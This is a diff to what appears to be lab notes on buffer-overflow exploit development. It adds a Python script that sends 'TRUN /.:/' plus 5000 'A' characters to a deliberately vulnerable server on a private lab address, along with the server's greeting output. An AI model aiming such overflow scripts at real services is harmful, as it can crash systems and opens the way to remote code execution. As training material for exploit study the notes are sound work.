@@ -834,6 +834,31 @@ s.close ## Close the socket
 ```
 python WinExploit.py
 ```
-- 
--
-- 
+results:
+```
+Welcome to SecureServer! Enter HELP for help.
+
+UNKNOWN COMMAND
+```
+- modify your script to have ```"HELP"``` as the value in the buf variable.
+- then change to "TRUN /.:/" & += "A" * 5000
+- script should now look like:
+```
+#!/usr/bin/env python
+
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 5000
+
+s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
+s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
+print s.recv(1024) ## Print to screen what we recieve
+s.send(buf) ## Send our buf variable
+print s.recv(1024) ## Print to screen what we recieve
+s.close ## Close the socket
+```
+
+
+
+    
